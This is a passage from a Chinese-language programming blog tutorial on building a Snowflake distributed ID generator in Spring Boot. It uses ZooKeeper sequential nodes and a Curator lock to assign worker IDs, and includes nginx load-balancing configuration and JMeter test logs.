        <span class="token keyword">long</span> timestamp <span class="token operator">=</span> <span class="token function">timeGen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>timestamp <span class="token operator">&lt;=</span> lastTimestamp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            timestamp <span class="token operator">=</span> <span class="token function">timeGen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> timestamp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 返回以毫秒为单位的当前时间
     *
     * @return 当前时间(毫秒)
     */</span>
    <span class="token keyword">protected</span> <span class="token keyword">long</span> <span class="token function">timeGen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h3>
<a id="43dataCenterId_510"></a>4.3、dataCenterId定义</h3> 
<p><strong>SystemSequence.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SystemSequence</span> <span class="token punctuation">{<!-- --></span>

    <span class="token comment">/**
     * 支付
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> PAY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 查询
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> QUERY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 通知
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> NOTICE <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * snowflake
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> SNOWFLAKE <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 管理
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> OMS <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 账户
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> AMS <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>  改造后的工作中心id最大为31（2的5次方），也就是可以有32个系统。当然一般这种定义文件一般是公共包或者存数据库，我这里只是一个事例，为了本文的阅读性。</p> 
<h3>
<a id="44servicefont_colorFF0000font__550"></a>4.4、service层（<font color="#FF0000">核心实现</font>）</h3> 
<p><strong>DistributedService.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">Snowflake</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">SystemSequence</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">ZookeeperClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">ZookeeperProperties</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>recipes<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">InterProcessMutex</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostConstruct</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@Service</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DistributedService</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token class-name">Snowflake</span> idWorker <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ZookeeperProperties</span> zookeeperProperties<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ZookeeperClient</span> zookeeperClient<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 系统启动就执行
     */</span>
    <span class="token annotation punctuation">@PostConstruct</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//获取锁路径</span>
        <span class="token class-name">String</span> lockPath <span class="token operator">=</span> zookeeperProperties<span class="token punctuation">.</span><span class="token function">getLockPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//创建InterProcessMutex实例</span>
        <span class="token class-name">InterProcessMutex</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InterProcessMutex</span><span class="token punctuation">(</span>zookeeperClient<span class="token punctuation">.</span><span class="token function">getCuratorFramework</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lockPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> success <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            success <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>success<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token function">initSnowflake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"snowflake系统启动初始化方法异常"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>success<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    lock<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">initSnowflake</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">boolean</span> create <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">//也可以是  xxx/id-</span>
            <span class="token class-name">String</span> nodeName <span class="token operator">=</span> <span class="token string">"snowflake/id-"</span><span class="token punctuation">;</span>
            <span class="token comment">//生成节点的完整路径</span>
            <span class="token class-name">String</span> fullPath <span class="token operator">=</span> zookeeperProperties<span class="token punctuation">.</span><span class="token function">getRootPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> nodeName<span class="token punctuation">;</span>
            <span class="token comment">//截取开始到最后一个/作为父路径</span>
            <span class="token class-name">String</span> path <span class="token operator">=</span> fullPath<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> fullPath<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//获取路径下所有子节点</span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> children <span class="token operator">=</span> zookeeperClient<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> children<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>children<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"节点已经超过32个了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">//生成唯一id</span>
            <span class="token class-name">String</span> generateId <span class="token operator">=</span> zookeeperClient<span class="token punctuation">.</span><span class="token function">generateId</span><span class="token punctuation">(</span>nodeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"zookeeper生成的原始id：{}"</span><span class="token punctuation">,</span> generateId<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//去除前缀id-</span>
            <span class="token keyword">long</span> workerId <span class="token operator">=</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>generateId<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>children<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token comment">//路径下的所有节点转为long型并对对32求模</span>
                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> collect <span class="token operator">=</span> children<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>p <span class="token operator">-&gt;</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>collect<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>workerId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token comment">//求模后列表里不重复</span>
                    create <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                    <span class="token comment">//实例化</span>
                    idWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Snowflake</span><span class="token punctuation">(</span><span class="token class-name">SystemSequence</span><span class="token punctuation">.</span>SNOWFLAKE<span class="token punctuation">,</span> workerId<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token comment">//workerId占用的可以删除节点</span>
                    zookeeperClient<span class="token punctuation">.</span><span class="token function">deleteTheNode</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> generateId<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                create <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                idWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Snowflake</span><span class="token punctuation">(</span><span class="token class-name">SystemSequence</span><span class="token punctuation">.</span>SNOWFLAKE<span class="token punctuation">,</span> workerId<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>create<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">generateId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//我这里就不做严格的判断了</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>idWorker <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">""</span> <span class="token operator">+</span> idWorker<span class="token punctuation">.</span><span class="token function">nextId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>  在这里我们要解释下一段代码：</p> 
<pre><code class="prism language-java">	idWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Snowflake</span><span class="token punctuation">(</span><span class="token class-name">SystemSequence</span><span class="token punctuation">.</span>SNOWFLAKE<span class="token punctuation">,</span> workerId<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>  <font color="#FF0000">SystemSequence</font>是我们定义的一个系统一个编号，不管是单机还是多实例，同一个系统不管是第一次启动还是第二次启动，都是不会变的，编号是从0开始到31，相当于是一个固定的值。而workerId是我们通过zookeeper生成的，具有顺序性和唯一性。比如从0000000000~9999999999，我这里实现的基本流程图如下：<br> <img src="https://images2.imgbox.com/ed/06/tEa93WnP_o.png" alt="在这里插入图片描述"><br> 我大概介绍下我们实现的基本流程</p> 
<ul>
<li><font color="#FF0000">整个初始化的流程中我使用curator分布式锁</font></li>
<li>首先我们定义一个节点的前缀，我建议每个系统带不同的前缀比如<font color="#FF0000">pay/id-</font>、<font color="#FF0000">query/id-</font>、<font color="#FF0000">snowflake/id-</font>，这样有个好处就是每个系统的节点都在一起便于分析节点，如果所有系统都在一起，那么你还得去分析节点的值才能判断节点是否可用</li>
<li>
<font color="#FF0000">获取生成节点的父路径下的所有的子节点</font>，如果节点的数目大于等于32，说明实例数已经满了，不能创建了，因为本文这里的workerId最大是31</li>
<li>
<font color="#FF0000">当子节点数目小于32，我们创建一个新的临时顺序节点</font>，去除节点的前缀后，用32对其求模（得到的workerId就是1~31）</li>
<li>如果子节点的数目大于0，小于32，我们把子节点里是数据都转为long型，并对用32对其求模</li>
<li>
<font color="#FF0000">判断计算后的workerId是否在求模后的列表中</font>，如果workerId在列表中，说明workerId已经占用，则删除节点后，继续循环上述流程，如果workerId不在求模后的列表中，直接初始化snowflake</li>
<li>还有就是如果节点列表为空，说明还没有实例启动，则创建一个新的临时顺序节点，去除节点的前缀后，对32求模，然后初始化snowflake</li>
</ul> 
<p>关于curator分布式锁不懂的可以参考：<a href="https://blog.csdn.net/Alian_1223/article/details/120852979">SpringBoot基于Zookeeper和Curator实现分布式锁并分析其原理</a></p> 
<p>但是为什么要对该数据求模呢？</p> 
<p>  首先我们知道workerId最大31，举个例子，我们系统每次启动就会生成一个唯一id，假设我们的实例部署了,31个（生成的节点编号是0000000000~0000000030），然后假设第30号服务重启了一次，重启时生成的节点编号是0000000031，这个时候，我们应该还可以部署一个新的服务，或者对任意一个系统进行重启，对吧？不管是新的服务，还是重启生成的编号是不是编号就是0000000032，这个32我们的snowflake肯定是接收不不了的，因为它的范围是0到31<br>   假设我们是第3台机器重启了，那么求模后的数为0，明显0已经被第一号机器占用了，我们只能继续生成节点，直到生成0000000034节点，求模后是2，也就是3号机器（3号机器重启时0000000002节点已经自动删除了），这下大家应该知道为什么对32求模了吧？<br> <font color="#FF0000"></font></p> 
<h3>
<a id="45controller_680"></a>4.5、controller层</h3> 
<p>  简单的一个获取id的接口，仅仅是为了演示，实际中肯定更加严格和规范。</p> 
<p><strong>DistributedIdController.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">DistributedService</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/distributed"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DistributedIdController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">DistributedService</span> distributedService<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 生成分布式id
     *
     * @return
     */</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/generateId"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">generateId</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> distributedId <span class="token operator">=</span> distributedService<span class="token punctuation">.</span><span class="token function">generateId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"获取到的分布式id:{}"</span><span class="token punctuation">,</span> distributedId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> distributedId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h2>
<a id="_716"></a>五、测试</h2> 
<h3>
<a id="51_717"></a>5.1、多实例</h3> 
<p>  由于我们是windows环境下的本机开发及测试，我们使用idea启动三个实例进行负载均衡，端口分别为<font color="#FF0000">6061</font>、<font color="#FF0000">6062</font>、<font color="#FF0000">6063</font>。</p> 
<p><strong>application.yml</strong></p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6061</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /snowflake
</code></pre> 
<p>三个实例启动的示例图：<br> <img src="https://images2.imgbox.com/55/1a/Bm5SMpqO_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="52nginx_730"></a>5.2、nginx转发配置</h3> 
<p>  自定义配置文件<font color="#FF0000">localhost_80.conf</font>里<font color="#FF0000">server</font>模块里增加转发配置，通过负载均衡到两个实例上。</p> 
<pre><code class="prism language-bat">	location ~ ^/snowflake/ {
        proxy_redirect off;
		#端口
        proxy_set_header Host $host;
		#远程地址
        proxy_set_header X-Real-IP $remote_addr;
		#程序可获取远程ip地址
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		#此处会用的upstream.conf,此文件在nginx.conf已经引入了
        proxy_pass http://snowflake;
    }
</code></pre> 
<p>负载均衡配置<font color="#FF0000">upstream.conf</font>文件增加下面的配置，其中<font color="#FF0000">snowflake</font> 就是<font color="#FF0000">localhost_80.conf</font>文件里配置的<font color="#FF0000">http://snowflake</font>;</p> 
<pre><code class="prism language-bat">	upstream snowflake {
	    server 127.0.0.1:6061 ;
		server 127.0.0.1:6062 ;
		server 127.0.0.1:6063 ;
	}
</code></pre> 
<p>如果你的nginx已经启动，最后记得使用命令<font color="#FF0000"> nginx -t </font>检查和<font color="#FF0000"> nginx -s reload </font>应用。如果不懂的可以参考我另一篇文章：<a href="https://blog.csdn.net/Alian_1223/article/details/120787288">windows下Nginx配置及负载均衡使用</a></p> 
<h3>
<a id="53jmeter_754"></a>5.3、使用jmeter并发测试</h3> 
<p>  本文中使用使用100个线程请求我的接口获取id，150表示线程数，0表示0秒内一起发送，1表示请求循环的次数。<br> <img src="https://images2.imgbox.com/ca/12/ydj9LHt0_o.png" alt="在这里插入图片描述"><br> 我们请求的地址是：<font color="#FF0000">http://localhost/snowflake/distributed/generateId</font>，注意是没有端口的，会通过nginx转发到后台实例。<br> <img src="https://images2.imgbox.com/dc/a3/2pcQRM3f_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="54_759"></a>5.4、测试结果</h3> 
<p>端口为6061实例的结果：</p> 
<pre><code>2021-11-17 17:38:54 170 [http-nio-6061-exec-24] INFO generateId 27:获取到的分布式id:2440808817528832
2021-11-17 17:38:54 170 [http-nio-6061-exec-8] INFO generateId 27:获取到的分布式id:2440808817528836
2021-11-17 17:38:54 171 [http-nio-6061-exec-26] INFO generateId 27:获取到的分布式id:2440808821723136
2021-11-17 17:38:54 170 [http-nio-6061-exec-3] INFO generateId 27:获取到的分布式id:2440808817528835
2021-11-17 17:38:54 171 [http-nio-6061-exec-1] INFO generateId 27:获取到的分布式id:2440808821723140
2021-11-17 17:38:54 171 [http-nio-6061-exec-2] INFO generateId 27:获取到的分布式id:2440808821723139
2021-11-17 17:38:54 171 [http-nio-6061-exec-22] INFO generateId 27:获取到的分布式id:2440808821723138
2021-11-17 17:38:54 170 [http-nio-6061-exec-40] INFO generateId 27:获取到的分布式id:2440808817528833
2021-11-17 17:38:54 170 [http-nio-6061-exec-34] INFO generateId 27:获取到的分布式id:2440808817528834
2021-11-17 17:38:54 171 [http-nio-6061-exec-49] INFO generateId 27:获取到的分布式id:2440808821723143
2021-11-17 17:38:54 171 [http-nio-6061-exec-29] INFO generateId 27:获取到的分布式id:2440808821723146
2021-11-17 17:38:54 171 [http-nio-6061-exec-48] INFO generateId 27:获取到的分布式id:2440808821723144
2021-11-17 17:38:54 171 [http-nio-6061-exec-17] INFO generateId 27:获取到的分布式id:2440808821723145
2021-11-17 17:38:54 171 [http-nio-6061-exec-36] INFO generateId 27:获取到的分布式id:2440808821723142
2021-11-17 17:38:54 171 [http-nio-6061-exec-20] INFO generateId 27:获取到的分布式id:2440808821723137
2021-11-17 17:38:54 172 [http-nio-6061-exec-35] INFO generateId 27:获取到的分布式id:2440808825917441
2021-11-17 17:38:54 172 [http-nio-6061-exec-4] INFO generateId 27:获取到的分布式id:2440808825917442
2021-11-17 17:38:54 172 [http-nio-6061-exec-38] INFO generateId 27:获取到的分布式id:2440808825917443
2021-11-17 17:38:54 171 [http-nio-6061-exec-43] INFO generateId 27:获取到的分布式id:2440808821723141
2021-11-17 17:38:54 172 [http-nio-6061-exec-41] INFO generateId 27:获取到的分布式id:2440808825917448
2021-11-17 17:38:54 172 [http-nio-6061-exec-11] INFO generateId 27:获取到的分布式id:2440808825917447
2021-11-17 17:38:54 172 [http-nio-6061-exec-13] INFO generateId 27:获取到的分布式id:2440808825917449
2021-11-17 17:38:54 172 [http-nio-6061-exec-28] INFO generateId 27:获取到的分布式id:2440808825917440
2021-11-17 17:38:54 172 [http-nio-6061-exec-44] INFO generateId 27:获取到的分布式id:2440808825917444
2021-11-17 17:38:54 173 [http-nio-6061-exec-31] INFO generateId 27:获取到的分布式id:2440808830111744
2021-11-17 17:38:54 173 [http-nio-6061-exec-16] INFO generateId 27:获取到的分布式id:2440808830111745
2021-11-17 17:38:54 173 [http-nio-6061-exec-9] INFO generateId 27:获取到的分布式id:2440808830111746
2021-11-17 17:38:54 172 [http-nio-6061-exec-39] INFO generateId 27:获取到的分布式id:2440808825917446
2021-11-17 17:38:54 173 [http-nio-6061-exec-27] INFO generateId 27:获取到的分布式id:2440808830111747
2021-11-17 17:38:54 173 [http-nio-6061-exec-37] INFO generateId 27:获取到的分布式id:2440808830111750
2021-11-17 17:38:54 173 [http-nio-6061-exec-12] INFO generateId 27:获取到的分布式id:2440808830111749
2021-11-17 17:38:54 173 [http-nio-6061-exec-18] INFO generateId 27:获取到的分布式id:2440808830111748
2021-11-17 17:38:54 173 [http-nio-6061-exec-7] INFO generateId 27:获取到的分布式id:2440808830111751
2021-11-17 17:38:54 172 [http-nio-6061-exec-19] INFO generateId 27:获取到的分布式id:2440808825917445
